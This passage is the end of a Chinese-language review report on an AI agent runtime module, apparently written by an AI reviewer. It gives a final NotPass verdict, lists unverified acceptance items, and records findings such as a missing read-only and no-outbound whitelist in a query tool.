| 11.3 / A-10 零伪造且失败可定位 | **NotPass（缺前置）** | 结构上"失败不可被隐藏"成立；**真实模型质量与全部领域轨迹未评估**，发布门槛为零的正式评估未做 |
| 12.2 Agent 闭环七项 | **NotPass（缺前置）** | 七项全部依赖真实模型、真实 Diff、真实事务与真实外发授权 |
| 附录 F / G.5 A-01…A-10 | **NotPass** | A-03/A-04/A-09/A-10 的**代码结构**成立；A-01/A-02/A-05/A-06/A-07/A-08 属他线与导出/HTML 范围，未验 |
| §10 非功能（两 OS、真人、性能容量、E2E/打包） | **NotPass（缺前置）** | 本轮按授权只做本机静态+受控运行；e2e/package/native/真人/CI/远端均未取得本线证据 |
| 附录 F 最后一行（SERVICE 禁外联） | **NotPass** | **P1-1** |
| 57 项 P0 / 发布门 / 父任务 | **NotPass** | 无任何本线通过证据；父 P0 未关闭；本审查不缩减任何 FR/A/Q9/11.3/12.2 |

---

## 10. 未验边界（明确声明）

**静态检查已覆盖且未发现问题**：codec 对未知/截断/空/非法结构的严格拒绝、必需 `reasoning_content` 的保留与拒绝、tool call/result ID 一致性、重放与边界长度、会话/交换/调用/输出预算的不可绕过性、整批参数预验（零领域执行）、可信 project/revision/snapshot/scope/module/mode/选择对象绑定、跨问题证据隔离、失败不被自由文本或只选成功引用隐藏、错误原文不外泄、字段投影最小化、DOM 文本安全与无资源注入、本地/未就绪/缺 handler/旧 context 的发送与 retry 禁用、v2 真实 RDFLib/CSV 观测的忠实性与同数量语义错识别。

**仅受控本地运行已覆盖**：本机 lint/格式/类型/单测/构建/ruff/pytest 全绿（717 TS + 1052 Py）；T08 定向 87 项全绿；审方 10 项行为探针全绿；12 个归档源文件一致。

**本线未验（且不可由本轮补齐）**：真实模型任何调用与正式受测模式/版本固定；真实领域查询/映射/推理/行为/沙盘服务与轨迹；T01 真实 Diff、真人确认、原子事务、撤销、快照恢复；I06 唯一安全传输、最终字节授权、凭据安全存储、最小外发记录、费用硬上限；公共 App/bridge 挂载与真实用户事件；Electron/native/E2E、两 OS、真人验收；CI、远端、push/PR/合并。

**因此不得据此宣称**：T08 功能通过、11.3/A-10 零伪造达标、12.2 闭环成立、父 P0 关闭、或任何"真实产品能力已交付"。

---

## 11. 最终结论

**不通过（NotPass）。**

- **完整原验收是否满足：否。** FR-800–806、FR-900–902/904、FR-204/302/400、附录 F、11.3 九类、12.2 七项中，**所有需要真实模型、真实领域服务、真实 Diff/事务/撤销、真实外发授权、真实页面/平台/真人证据的关键验收均未执行或不可执行**；本线交付物经实测确认为**未接线的纯模块**（构建产物零命中、无 preload 桥接、无 IPC 通道、组件未挂载）。
- **阻断项**：缺前置类（真实 API/领域/界面/平台/真人/CI/远端，归属 I06、T01、T02–T07、T00、T09）；可修代码类 **1×P1**（`query_execute` 白名单层未实施只读+禁外联与"阻止并解释"，`tools.ts:20-24,32,56`）、**7×P2**（响应路径未强制固定受测模型身份；thinking 退化检测有条件；实际用量未与上限比对；失败码投影丢失；交互行为零自动化证据；local 档无离线能力实体；隐私档位未进入主进程数据形状）、**3×P3**（上下文比较顺序敏感；错误码语义；私有词汇无防分叉断言）。
- **历史 8 份内审意见逐项复核：全部保持关闭，无回退。**
- 本报告**不修改**任何实现、测试、配置、依赖、锁或 AGENTS；未 stage、未 commit、未 push、未切分支；未读取 peer 报告/队列、globalconfig、其他任务或父 `.worktrees`；未调用付费 API，未读取任何密钥。
- 后续由原 owner 按唯一写面修复上述可修项并出新候选、再做必要验证与双方同版新完整审查；真实集成须在 I06/T01/T00/T09 的具体批准接口与阶段授权就绪后逐项推进。

---

*本报告为本轮唯一报告正文，写于本审查树 `docs/reviews/T08/review-runtime/reports/minimax-m31flash.md`。历史失败与内审原文一律未被改写。*
